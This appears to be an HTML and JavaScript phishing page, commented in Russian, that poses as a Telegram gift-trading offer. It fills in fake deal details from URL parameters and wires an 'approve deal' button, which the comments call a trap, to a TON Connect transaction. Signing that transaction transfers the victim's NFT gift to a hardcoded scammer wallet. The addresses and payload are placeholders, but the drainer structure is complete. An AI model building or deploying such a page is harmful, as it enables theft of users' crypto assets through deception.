<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Telegram Trade</title>
    <!-- Подключение официальной библиотеки TON Connect для связи с кошельком -->
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        /* Использование системных переменных Telegram для мимикрии под тему пользователя */
        body { 
            background-color: var(--tg-theme-bg-color); 
            color: var(--tg-theme-text-color); 
            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
            margin: 0; padding: 20px; text-align: center;
        }
        .details { background: var(--tg-theme-secondary-bg-color); border-radius: 12px; padding: 15px; margin: 20px 0; }
        .btn { background: #3390ec; color: white; padding: 15px; border-radius: 12px; width: 100%; border: none; font-size: 16px; font-weight: 600; }
    </style>
</head>
<body>
    <div class="modal">
        <!-- Пустые ячейки (каркас) -->
        <h2 id="gift-title">Загрузка сделки...</h2>
        <div class="details">
            <p>Узор: <span id="gift-pattern">...</span></p>
            <p>Предложенная цена: <b id="offer-price">...</b> ⭐</p>
        </div>
        
        <!-- Кнопка-капкан -->
        <button id="accept-btn" class="btn">Утвердить сделку</button>
    </div>

    <script>
        // === ЭТАП 1: СКРИПТ-ОФОРМИТЕЛЬ (Мгновенная подмена визуала) ===
        const urlParams = new URLSearchParams(window.location.search);
        
        // Читаем данные из ссылки
        const itemName = urlParams.get('item').replace('_', ' '); // Получаем "Lol Pop"
        const itemID = urlParams.get('id');                       // Получаем "419653"
        const itemPattern = urlParams.get('pattern');             // Получаем "Skull"
        const offerPrice = urlParams.get('price');                // Получаем "2390"

        // Вставляем данные в пустые ячейки на экране
        document.getElementById('gift-title').innerText = itemName + ' #' + itemID;
        document.getElementById('gift-pattern').innerText = itemPattern;
        document.getElementById('offer-price').innerText = offerPrice;

        // === ЭТАП 2: СКРИПТ-КАПКАН (Вызов криптокошелька) ===
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://trade-tg.github.io/tonconnect-manifest.json'
        });

        document.getElementById('accept-btn').addEventListener('click', async () => {
            // Жестко заданный адрес кошелька злоумышленника
            const scammerAddress = "EQD_Scammer_Wallet_Address_Here";
            
            // Формирование вредоносного контракта на передачу NFT
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 300,
                messages: [
                    {
                        address: "EQD_Lollipop_NFT_Contract_Address", // Адрес смарт-контракта вашего подарка
                        amount: "50000000", // Комиссия сети TON за транзакцию
                        // Скомпилированная команда блокчейну: Transfer NFT -> ScammerAddress
                        payload: "te6cckEBAQEAAgAAAA==" 
                    }
                ]
            };

            try {
                // Вызов системного окна Telegram Wallet для сканирования Face ID / ввода пароля
                await tonConnectUI.sendTransaction(transaction);
            } catch (e) {
                console.log("Отказ от подписи транзакции");
            }
        });
    </script>
</body>
</html>
